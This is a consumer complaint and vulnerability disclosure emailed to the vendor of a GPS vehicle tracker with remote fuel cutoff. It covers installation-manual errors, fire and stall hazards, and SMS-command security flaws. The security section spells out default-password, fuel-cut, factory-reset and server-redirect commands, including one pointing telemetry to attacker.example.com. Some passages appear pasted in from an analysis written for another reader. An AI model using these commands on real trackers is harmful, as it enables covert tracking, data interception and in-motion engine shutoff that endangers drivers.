# Sentriwise-Issues
GPS Tracker product causing risk of death. 

I am writing this email to your company, Sentriwise this evening because I have recently purchased one of your GPS trackers. So far the experience has been abysmal and I have been unable to install the tracker in my
vehicle due to incorrect wiring diagrams and contradictory information. - That is a minor issue, and a much more, and very significant and serious issue has come to light with regards to your product, that you are supplying
to the Australian domestic market. 

I make note that this is very serious, dangerous matter of life and death. I am not exaggerating in the slightest when I say that. This product has the capability to kill people and cause significant harm - I bet you have
absolutely no idea how that is possible. The purpose of this email is to advise you in writing, formally of serious defects with your product, and to give you the formal time to pull the product  from sale before I 
report this to the appropriate authorities. It is very clear that your company has not done proper and correct due diligence on exactly what you are selling to people. 

Confused? Let me elaborate. 

From the provided PDF installation manual alone, several things stand out as concerning,ranging past items that would not pass a proper safety review all the way up to this product causing the death of one or more persons directly.

The issues are...

1. The fuel-pump cutoff topology, as described, can stall the engine while moving.
The manual specifies the relay's green wire 87a (normally-closed) goes to the fuel pump positive, with green wire 30 (common) on the starter-motor side. When the relay is energized via the device's yellow signal line, contact swaps from 87a to 87 (open), cutting fuel-pump power. There's no documented interlock for vehicle speed or engine RPM — meaning if the cellular command to cut fuel arrives while the car is doing 110 km/h on a highway, the engine dies and the driver loses power steering and brake assist. The manual is silent on this. Real-world incidents in this device class have killed people: there was a 2014 NYT investigation into subprime auto-loan GPS shutoff devices (PassTime, etc.) that documented multiple accidents and at least one near-fatality from in-motion shutoff. California, Colorado, Nevada have specific laws now restricting in-motion immobilizers as a result. This manual offers no guidance on any such interlock, no disclosure of the safety risk, no jurisdictional compliance note.

2. Missing fuse / wire-gauge specification.
It says "Relay's white line connects to the positive side of battery (12V)" with no fuse spec, no wire gauge, no recommended placement. Wiring a permanent live to battery+ without an inline fuse is a fire risk. Any reputable automotive electrical install spec mandates a fuse within 6 inches of the battery on any added live. The manual omits this entirely.

3. The "ignition wire" warning is correct but underspecified.
"Be sure to check if it's a real ignition wire i.e. power does not disappear after starting the engine." — they're flagging the well-known confusion between ACC (powered in accessory + run, drops during cranking) and IGN / RUN (powered after key release). Conflating them causes the device to log false ignition cycles. The warning is real but the manual provides no method for testing — no multimeter procedure, no expected voltages, no waveform description.

4. "Do not connect with other ground wires simultaneously."
This is unusual phrasing and suggests they've had ground-loop problems with shared chassis grounds. A properly designed automotive accessory shouldn't have this restriction; it implies the device's ground reference is sensitive in a way that shouldn't be in a robust design.

5. No CAN-bus consideration.
Modern vehicles (anything ~2010+) often have CAN-controlled fuel pumps where the ECU manages the pump via a body-control module rather than a simple +12V feed. Cutting a relay in series with what you think is the fuel pump positive on a CAN-controlled vehicle can:
Trigger a CEL / limp mode
Cause the ECU to throw fuel-pressure faults
Be detected by anti-theft as tamper and disable the engine permanently until dealer reset
The manual addresses none of this. It assumes a 1990s-style direct-wired fuel pump on every vehicle.

6. Manual quality red flags
Author / authoring chain — /Author: 'Microsoft Office User' (default placeholder, never customised), /Creator: 'Adobe Illustrator 25.0 (Windows)', /Producer: 'Microsoft® Word 2013', timestamp timezone +08'00' (China Standard Time). Pattern: translated-from-Chinese product manual produced by someone who didn't bother setting the document author. The creators of this manual have no business whatsovever instructing on the installation of automotive electrical items. This is a serious quality issue at minimum and a safety hazard as well. The end users of this product are not mechanics or auto electricians and they are trusting that you have given them true and correct information to use the product. This is very dangerous. Typos that suggest no QA pass — "lgnition wire" (lowercase L instead of capital I) appears in body text. That's the kind of error that gets caught on first proofread of a serious safety document. It wasn't.

I find it also equally disturbing the contents of the installation manual as what is NOT in the installation manual....

For a device that can remotely disable a moving vehicle:
-No mention of regulatory certifications (FCC ID, CE, RCM for AU/NZ, IC for Canada). Devices with cellular radios sold legally in any of these jurisdictions must have a marking. Not declared.
-No liability disclosure about in-motion shutoff safety
-No jurisdictional compliance note (some US states require informed consent, written notice, no-shutoff-while-moving interlocks)
-No data handling / privacy note — where the GNSS+cellular telemetry goes, who controls the platform, retention period, jurisdiction of data storage
-No OTA/firmware update procedure (which means whoever owns the platform owns the device behaviour)
-No decommissioning procedure (how do you safely remove this from a vehicle? matter for repo/return scenarios)
-No fail-safe behaviour specification — what does the relay do if the device loses power, loses GPS, loses cellular, gets a corrupted command, has a firmware bug?
-No default credentials disclosure or change procedure — devices in this class are notorious for shipping with hard-coded SMS command passwords

It further bewilders and amazes me that the device is so hackable that it is not funny at all. This is beyond a joke. This is a class of device where the actual security and safety story matters more than the manual suggests. A short list of known issues with this entire device family (Concox, Coban, MiCODUS, and various unbranded VL-prefixed Chinese trackers — VL101G/VL103/VL502 etc. are part of this lineage):

-MiCODUS MV720 (BitSight, 2022, CISA ICSA-22-200-01): six CVEs including hard-coded SMS password, default 123456 web password, IDOR letting any user pull any other user's tracking history, ability to remotely cut fuel of any device on the platform without authentication. ~1.5M devices affected globally. Same architecture as VL-series.
-Concox / iTrack (multiple disclosures 2019-2023): authenticated SMS commands could be sent by anyone who knew the device's IMEI; IMEIs were sequential and predictable.
-SinoTrack (2024): unauthenticated platform access via guessable device IDs. Fuel-cut commands available to anyone who guessed the ID.

The VL101G falls in this product family. Without testing it I can't say it has these specific bugs, but the manual quality, the document-author defaults, the missing safety/security discussion, and the device class all suggest it would not survive a serious security review.


This information and the fact that you are selling this product in a country like Australia.....is absolutely fucking amazing. This is so shockingly bad, and so reflective of your companies ethics and attitudes that I am actually gobsmacked. This is actually some fucked up shit.

As for the minor issue with the lack of customer & technical support, and the issues with the installation manual - here is a detailed list of every single error that the installation manual contains. Make no mistake - these are just as important as the above information is.

Wiring & relay diagram errors
1. The "white line" referenced in text doesn't exist on the device.
Page 6 (Interfaces table) defines the device's six wires explicitly: Red (V+), Black (V−), Orange (ACC), Yellow (Relay), Blue (TTL RX), Green (TTL TX). There is no white wire in the device's harness.
But page 7 says: "Relay's white line connects to the positive side of battery (12V)."
This is a fundamental documentation error. There is no white wire to connect. The text is presumably trying to describe the wire from the relay coil (probably pin 85 or 86) to battery+, but it calls it "white" with no source for that color. An installer following this instruction looks at the harness, finds no white wire, and either gives up or — worse — improvises by guessing.

2. Color collision: "green line" means two different things in the same document.
Page 6 says Green = TTL TX (a low-voltage data line on the device's harness).
Page 8 says: "The positive side of fuel pump connects to the green line(87a) while the side closing to starter motor connects to green line(30)."
Here "green line(87a)" and "green line(30)" refer to the relay's high-current contact wires going to/from the fuel pump — completely different wires from the device's TTL TX. Same color word, two entirely different functions, no disambiguation. This is the kind of documentation collision that gets installers welding TTL signals onto fuel-pump current. It's also exactly the sort of thing that should never survive a single editorial pass.

3. No fuse on the high-current side of the relay — fire hazard.
The page 7 diagram shows a 2A fuse on the device's V+ supply only. That protects the tracker electronics (a few hundred mA load). It does not protect the relay's contact circuit, which is in series with the fuel pump.
A fuel pump pulls 5–15 A continuously, with inrush spikes on start. The diagram routes the relay's contact (pin 30 ↔ pin 87a) directly between battery+ and the fuel pump with no inline fuse on that side at all. If the relay contact welds, fails short, arcs, or if the wire chafes against a body panel, you have an unfused circuit running at potentially 30+ amps to whatever wire happens to short. That is an automotive fire scenario — the kind that lights up a dash loom and takes the car with it. Any reputable automotive add-on accessory mandates a fuse within ~6 inches of the battery on any added live, and a separate fuse on the load side at the relay. Neither is shown.

4. The relay diagram is missing pin 87 entirely.
Standard ISO 7588 / DIN 72552 5-pin automotive relay numbering: 85 (coil ground), 86 (coil +), 30 (common), 87 (normally-open contact), 87a (normally-closed contact). The diagram shows only 86, 30, 87a, 85 — pin 87 is absent.
If the relay is genuinely a 4-pin (no NO contact, only NC), that's an unusual choice that should be explicitly called out. If it's a standard 5-pin and they just didn't draw pin 87, the installer doesn't know whether to leave 87 unterminated or wire it somewhere — and an unterminated NO contact in an automotive engine bay can cause arcing and EMC issues.

5. Pin 85 (the second coil terminal) has no clearly defined return path in the diagram.
For the relay coil to actuate, both 85 and 86 need to complete a circuit. The yellow wire from the device is shown going to one of them (presumably 86, but the spatial layout is ambiguous). The other coil terminal needs to be tied to ground (or to a switched +12V, depending on whether the device sources or sinks the control signal). The diagram doesn't make this clear. Different wiring conventions here — sourcing vs sinking — give entirely different actuation behaviour.

6. The voltage selection note (12V vs 24V relay) is buried in body text, not on the diagram.
Page 8 says: "12V relay is standard. The device is suitable for vehicles with 12V supply. If the vehicle power supply is 24V, use 24V relay."
This is a critical safety/compatibility note — it should be on the diagram as a callout, not buried mid-paragraph. Installing a 12V relay coil into a 24V truck (common for heavy commercial fleets) burns the coil, sometimes causes the relay to latch in the wrong state, and can damage the device's yellow control output.

7. The orange (ACC) wire's termination is visually ambiguous.
The diagram shows the ignition key with positions OFF / ACC / ON / START. The orange wire from the device drops down past the relay area and into a junction near the ignition switch. It is not clearly attached to the ACC terminal specifically. If an installer terminates it on the IGN/RUN circuit instead, the device misreads the ignition state — every cranking event will look like a power dropout because IGN/RUN typically loses power during START whereas ACC does not. The vehicle then logs spurious ignition cycles and false "engine off" events.

8. The "cut here" scissors annotation is on the wrong side of the discussion.
The diagram shows a scissors symbol indicating the user cuts an existing vehicle wire and inserts the relay contacts in series. It's on the fuel pump positive feed. There is no annotation telling the installer to add an inline fuse at the cut point, and no annotation telling them to use crimp connectors with heat-shrink or solder-and-seal. Implicit assumption: the installer is a trained auto-electrician. Manual is sold globally to whoever buys it.

9. The "starter motor" reference is genuinely dangerous.
Page 8: "the side closing to starter motor connects to green line(30)."
Read literally, an installer might cut into the starter solenoid trigger wire instead of the fuel pump feed. Starter solenoid trigger inrush can hit 30–100 A momentarily; if you put a 20 A fuel-pump-rated relay contact there, it welds the contacts on the first crank and the engine becomes uncrankable. The phrasing is meant to indicate "the section of fuel pump wire that runs back toward the front of the vehicle" but it doesn't say that.

10. No in-motion-shutoff hazard warning anywhere on the wiring/relay diagrams.
The whole point of this relay topology is that the device can remotely cut the fuel pump via SMS. Doing this while the vehicle is in motion stalls the engine, kills power steering and brake assist, and has caused documented injuries and at least one near-fatality in the subprime auto-loan tracker industry (PassTime / GPS Tracking Inc., NYT 2014). California, Colorado and Nevada now restrict in-motion immobilizers as a result. Not a single warning about this on the diagram, in the relay-wiring text, or in the SMS command reference where the cutoff command is described.

11. Page 7 and page 8 diagrams disagree.
Page 7's diagram shows the relay coil hooked up with yellow from the device but treats the contact side as a generic "cut and insert." Page 8's smaller diagram labels the contact side specifically as fuel pump and starter motor sides, with different colour conventions. Anyone reading the two pages back-to-back would have to reverse-engineer how the two views correspond. They aren't drawn to a consistent convention.

Security / command-reference issues
These are arguably worse than the wiring problems because they're not just bad-installation hazards — they're remote-attack surface.

12. Default SMS command password is 666666.
Page 11 PASSWORD command example: PASSWORD,666666,888888#. That's the user changing the default 666666 to 888888. The default is six identical digits — first thing any half-trained attacker tries on this entire device family.

13. SMS command authentication is OFF by default.
Page 16 PWDSW command: PWDSW:OFF. Out of the box, the device does not require any password to accept SMS commands. Anyone who knows the device's phone number can send the fuel-cut command by SMS. Find the SIM number — by social engineering, by asking the fleet manager, by reading a service invoice — and you have remote shutoff capability over a vehicle you don't own.

14. The fuel-cut command is one SMS.
Page 13 RELAY command: RELAY,1# → response Cut off the fuel supply: Success!. No 2FA, no rate limit, no "are you sure," no in-motion check, no logging visible to the driver. One SMS, fuel pump dead.

15. Default server is in mainland China — all telemetry phones home to Guangdong.
The CHECK# response on page 10 shows the device's default operational state:
SERVER:1,test.topstargps.com,11139 — primary server
GET IP:120.234.211.126 — that IP is in Guangdong, China Telecom (AS4134)
APN:CMnet — China Mobile internet APN
IMSI:460044335609859 — MCC 460 = China; the SIM is a Chinese carrier SIM (China Unicom)
ICCID:898604231919C2690159 — Chinese SIM serial
GMT default E,8 — China Standard Time
EURL:http://maps.google.com/maps?q= — default location-link URL is Google Maps, which doesn't even resolve in China. Translation artefact.
Backup server example: gpsdev.jimicloud.com — Jimi IoT (Jimi Cloud) is a major Chinese GPS-tracker platform vendor; either this device is Jimi-OEM or the manual was copy-pasted from a Jimi reference manual.
By default, every location, every speed event, every harsh-brake alert, and every ignition-on/off transition for every vehicle this device is installed in is being sent to a server in mainland China, over a Chinese mobile carrier, with no encryption documented. That's a deployment fact regardless of who buys it.

16. The SERVER command lets anyone redirect the tracker.
Page 12: SERVER,0,120.234.211.126,11139# — change the device's primary server to any IP/port you like. Combined with PWDSW:OFF (default), an attacker who knows the SIM number can:

Redirect the device to their own server (SERVER,0,attacker.example.com,12345#)
Wait for the device to connect to them
Track the vehicle without the legitimate owner's platform ever seeing a thing
Optionally send FACTORY# afterwards to wipe traces and let the device reconnect to its real platform
The legitimate fleet manager sees "vehicle offline" briefly, then "vehicle online again" — and never knows that for some interval the data went to a third party.

17. The FW (Forward via SMS) command is an SMS-laundering primitive.
Page 16: FW,13794562921,5201314# → "The number 13794562921 receives: 5201314." The device will send arbitrary SMS to arbitrary numbers under its own SIM. Anyone with command access can use the device's phone number as an outbound SMS proxy — useful for SIM-spoofed messages to evade caller-ID-based security, anonymise harassing texts, or seed phishing campaigns. The legitimate owner gets the carrier bill.

18. The SMSTC command exfiltrates inbound SMS.
Page 16: SMSTC,0# / SMSTC,1# controls whether SMS messages received by the device's SIM are forwarded to a configured server. If anyone — bank, government, family member — texts the device's phone number, the message gets forwarded to whoever set the server. Combined with the SERVER reconfiguration above, this is a turn-key SMS interception primitive.

19. The CENTER command can be reset by SMS.
Page 16: CENTER,A,13672436152# adds a "center number" (privileged management number that can override other restrictions). CENTER,D# deletes it. An attacker who briefly compromises command access can register their own number as the center, granting persistent privileged control even after the legitimate owner notices and changes the password.

20. The FACTORY# command wipes everything.
Page 11: FACTORY# → "The terminal will restart after 30s!" — resets to factory defaults. Restores PWDSW:OFF. Restores default password 666666. Restores default server. Any attacker who burns their cover can wipe forensic state with one SMS and the device returns to default-attackable mode.

Manual-quality issues
21. PDF metadata reveals translation pipeline.
/Author: 'Microsoft Office User' (default placeholder, never customised). /Producer: 'Microsoft® Word 2013'. /Creator: 'Adobe Illustrator 25.0 (Windows)'. Timestamp +08'00' = China Standard Time. Translated-from-Chinese product manual produced by someone who didn't bother to set the document author.

22. Typo lgnition wire (lowercase L instead of capital I).
In body text on page 7. Caught immediately on any QA pass. Wasn't.

23. Image-only configuration pages.
8 of 18 pages are raster-only — no extractable text. Includes the full SMS command reference (pages 10–16) and key wiring detail. A safety-critical manual where the configuration section can't be searched, copy-pasted, machine-translated, or screen-read is itself a documentation fail. We had to render and OCR-equivalent every page just to get readable content.

24. Page 9 is essentially a stub.
Just the headers "Platform & APP" and "Commands" with no body. No platform URL, no app name, no link, no QR code, no support contact. The "Commands" section that follows is rendered as table images only.

Regulatory / safety gaps
25. No declared FCC ID, CE, RCM, IC, or other regulatory marks.
A device with a cellular modem, a GNSS receiver, and an internal battery sold internationally requires regulatory marking under FCC Part 15/22 (US), CE/RED (EU), RCM (AU/NZ), IC (Canada). None disclosed. None of these certifications is visible anywhere in the manual.

26. No installer safety procedure.
No "disconnect battery before installation." No wire gauge spec. No torque spec for screw terminals. No mounting location guidance other than "the device should be fixed on the vehicle stably, it's very important!". No avoid-airbag-wiring note. No avoid-fuel-line note. No EMC consideration about routing the GSM antenna.

27. No CAN-bus integration consideration.
Modern vehicles (~2010+) often have CAN-controlled fuel pumps via the body-control module, not a simple +12V feed. Splicing a relay into what you think is the fuel pump positive on a CAN-controlled vehicle can throw fuel-pressure faults, trigger limp mode, or cause anti-theft to permanently disable the vehicle until a dealer reset. The manual addresses none of this — it assumes a 1990s-style direct-wired fuel pump on every vehicle.

28. No firmware update / vulnerability handling procedure.
No version-control statement. No update mechanism documented. No way for an installer or owner to know what firmware is running, whether it's current, or whether it has a known CVE. (The device family — Jimi/Concox/MiCODUS lineage — has had multiple CVEs disclosed, including CISA ICSA-22-200-01 with six CVEs against MiCODUS MV720, same architecture class.)

Net read
The wiring/relay diagrams have multiple specific, identifiable errors that would lead an installer to: (a) look for a wire that doesn't exist, (b) confuse two different "green" wires, (c) skip a critical fuse, (d) leave a relay pin unterminated, (e) wire ACC to the wrong ignition position, and possibly (f) cut into the starter circuit instead of the fuel pump.

The SMS command reference describes — without any apparent awareness that this is bad — a remote vehicle-immobilizer with default-off authentication, a default password of 666666, a configurable server pointing to mainland China by default, an SMS-redirection primitive, an SMS-exfiltration primitive, and a remote-factory-reset that an attacker can use to cover tracks.

This is not a one-off bad manual. It's representative of the entire low-cost Chinese GPS-tracker class — Jimi, Concox, MiCODUS, Coban, SinoTrack, and the various unbranded VL-prefixed devices. CISA has issued alerts on essentially this architecture (ICSA-22-200-01). BitSight in 2022 demonstrated unauthenticated mass tracking and mass fuel-cut against the MV720 specifically. The same class of device gets sold worldwide for fleet management, subprime auto loans, parental tracking, and — relevant to your existing project domain — has been recovered from covert installs on private vehicles in stalking and intimate-partner-abuse cases.

If this device is being installed on something you care about — fleet, personal vehicle, or anything where in-motion engine cut would matter — the safe move is don't. If it's already installed and you want to neutralise it, the practical options are: (a) physical removal, (b) Faraday-wrap the GSM antenna, (c) pull the SIM, or (d) cut the yellow control wire at the relay (this disables the immobilizer function without disabling the location/telemetry).

I highly recommend you engage a high end legal counsel, immediately.

Regards,

Jack Leighton

0434 645 485
